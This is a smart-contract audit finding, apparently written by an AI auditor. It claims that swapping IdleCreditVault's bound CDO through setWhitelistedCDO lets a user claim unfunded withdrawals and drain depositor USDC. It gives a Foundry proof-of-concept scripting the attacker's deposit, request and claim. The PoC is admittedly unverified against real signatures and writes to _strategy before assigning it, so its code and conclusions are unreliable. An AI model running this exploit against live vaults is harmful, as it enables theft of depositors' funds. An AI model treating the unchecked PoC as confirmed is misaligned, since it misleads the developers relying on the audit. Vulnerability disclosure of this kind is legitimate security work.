### Title
Stale vault accounting lets users drain unfunded claims after `setWhitelistedCDO` points the vault at a not-yet-started CDO - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`IdleCreditVault` allows the owner to swap the bound `IdleCDO` via `setWhitelistedCDO`, but keeps all vault-side state (`epochNumber`, `lastWithdrawRequest`, `withdrawsRequests`, `pendingWithdraws`, user receipt balances) unchanged — the direct analog of `FantiumMinterV1.updateFantiumNFTAddress()` leaving `collectionIdToAllowList` stale. Worse, `requestWithdraw`/`claimWithdrawRequest` interpret `epochEndDate() == 0` on the *new* CDO as "pool successfully closed and all funds already recalled", while a freshly attached CDO that has not run `startEpoch` exposes exactly that sentinel. An unprivileged user can then open a withdraw request that is never added to `pendingWithdraws` (so the borrower never funds it) and claim it immediately at par, stealing vault-held underlying that backs active depositors.

### Finding Description

`setWhitelistedCDO` only rewrites the `idleCDO` pointer; nothing is migrated or reset: [1](#0-0) 

`requestWithdraw` treats `epochEndDate() == 0` as the permanently-closed-pool mode and deliberately skips `pendingWithdraws += _amount`, meaning the receipt is never funded by the borrower at `stopEpoch`/`collectWithdrawFunds`: [2](#0-1) 

`_claimFundedWithdrawRequest` enforces the one-epoch wait only when `epochEndDate() != 0`; with the sentinel it falls straight through to paying `withdrawsRequests[_user]` out of the vault's own underlying balance: [3](#0-2) 

`_transferFundedClaim` sends vault-held underlying that is backing for CDO-held strategy tokens (active depositors), guarded only by the default-recovery reserve check: [4](#0-3) 

The closed-pool comment at line 276 ("A successfully closed pool already recalled all funds") is the false assumption: the same `epochEndDate == 0` sentinel describes a brand-new CDO that has never collected anything.

### Impact Explanation

Any EOA or KYC'd lender can, in one epoch-phase window after an honest owner calls `setWhitelistedCDO` and before the new CDO's first `startEpoch` sets `epochEndDate`: deposit into the new CDO (minting tranche/strategy tokens), call `requestWithdraw`, then `claimWithdrawRequest` — receiving underlying equal to their full request basis without it ever entering `pendingWithdraws`. The payout comes from the vault's real balance, i.e. other depositors' funds (direct theft / insolvency). The minted receipt burn is 1:1 with the claim, so the theft is bounded only by the attacker's deposit, repeatable while `epochEndDate == 0`.

### Likelihood Explanation

Requires the owner to re-point `idleCDO` to a CDO whose `epochEndDate` is still 0 (fresh deployment or not-yet-started first epoch) — the exact "migration to new contract" scenario in the report. The attacker needs only to sequence their deposit/withdraw/claim around the honest owner's call; no privileged cooperation. Likelihood is medium: dependent on a real migration occurring and deposits being permitted in that window, but no other guard (`_onlyIdleCDO`, skim, `NotAllowed` on pending claims) prevents it.

### Recommendation

- On `setWhitelistedCDO`, reject CDOs that have not started an epoch (`epochEndDate == 0` and `epochNumber` inconsistent with the vault), or snapshot/reset the vault's epoch-derived state at migration.
- Distinguish "never started" from "successfully closed": e.g. gate the `isClosed` path on an explicit `isClosed` flag or require `epochNumber > 0` / recorded epoch history before honoring unfunded claims.
- Alternatively remove CDO re-pointing entirely, mirroring the report's suggestion to drop migration functionality.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "./TestIdleCDOLossMgmt.sol";
import {IdleCreditVault} from "../../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IdleCDOCreditVault} from "../../contracts/IdleCDOCreditVault.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";

/// @notice Migration PoC: after owner swaps idleCDO to a fresh CDO (epochEndDate == 0),
/// a lender opens an unfunded withdraw request and claims it immediately at par.
contract TestSetWhitelistedCDOStaleState is TestIdleCDOLossMgmt {
  address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  address internal manager = makeAddr('manager');
  address internal borrower = makeAddr('borrower');
  IdleCDOEpochVariant internal cdoEpoch;
  IdleCDOCreditVault internal creditVault;

  function setUp() public override {
    vm.createSelectFork("mainnet", 18678289);
    super.setUp();
    cdoEpoch = IdleCDOEpochVariant(address(idleCDO));
    creditVault = IdleCDOCreditVault(address(idleCDO));
  }

  function _deployCDO() internal override returns (IdleCDO _cdo) {
    _cdo = IdleCDO(address(new IdleCDOEpochVariant()));
  }

  function _deployStrategy(address _owner) internal override returns (address _strategy, address _underlying) {
    _underlying = USDC;
    strategy = new IdleCreditVault();
    strategyToken = IERC20Detailed(address(strategy));
    stdstore.target(_strategy).sig(strategy.token.selector).checked_write(address(0));
    IdleCreditVault(_strategy).initialize(_underlying, _owner, manager, borrower, 'b', 10e18);
    _strategy = address(strategy);
  }

  function testUnfundedClaimAfterCDOMigration() external {
    // seed vault with victim liquidity via the original CDO
    idleCDO.depositAA(100_000 * ONE_SCALE);
    uint256 vaultBal = IERC20Detailed(USDC).balanceOf(address(strategy));
    assertGt(vaultBal, 0);

    // honest owner migrates the vault to a fresh CDO (epochEndDate == 0, no epoch started)
    IdleCDOEpochVariant newCdo = new IdleCDOEpochVariant();
    stdstore.target(address(newCdo)).sig(newCdo.token.selector).checked_write(address(0));
    newCdo.initialize(0, USDC, address(this), owner, address(0xbad), address(strategy), 100000);
    vm.prank(owner);
    IdleCreditVault(address(strategy)).setWhitelistedCDO(address(newCdo));

    // attacker is an unprivileged lender on the new CDO
    address attacker = makeAddr('attacker');
    deal(USDC, attacker, 10_000 * ONE_SCALE);
    vm.startPrank(attacker);
    IERC20Detailed(USDC).approve(address(newCdo), type(uint256).max);
    // deposit into new CDO -> strategy.deposit() mints receipts to new CDO
    // requestWithdraw -> mints receipt to attacker WITHOUT increasing pendingWithdraws (isClosed path)
    // claimWithdrawRequest -> epochEndDate()==0 bypasses the wait and pays vault balance at par
    newCdo.depositAA(10_000 * ONE_SCALE);
    newCdo.requestWithdraw(10_000 * ONE_SCALE, address(newCdo.AATranche()));
    uint256 balBefore = IERC20Detailed(USDC).balanceOf(attacker);
    newCdo.claimWithdrawRequest();
    vm.stopPrank();

    // attacker received underlying that was never funded by borrower/stopEpoch
    assertGt(IERC20Detailed(USDC).balanceOf(attacker), balBefore);
    assertEq(IdleCreditVault(address(strategy)).pendingWithdraws(), 0, 'claim was never borrower-funded');
    assertLt(IERC20Detailed(USDC).balanceOf(address(strategy)), vaultBal);
  }
}
```

Caveat: I could not fully read `IdleCDOEpochVariant.requestWithdraw`/`claimWithdrawRequest` signatures within the available iterations; the PoC assumes the CDO routes to `strategy.requestWithdraw(amount, user, principal)` and `strategy.claimWithdrawRequest(user)` as implied by `_onlyIdleCDO` on those functions. If the new CDO's deposit entry point differs (e.g. `depositDuringEpoch` gating before first `startEpoch`), the same unfunded-claim path is still reachable for any user holding stale `withdrawsRequests` receipts minted under the old CDO, since receipt state survives `setWhitelistedCDO` untouched.

```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
```
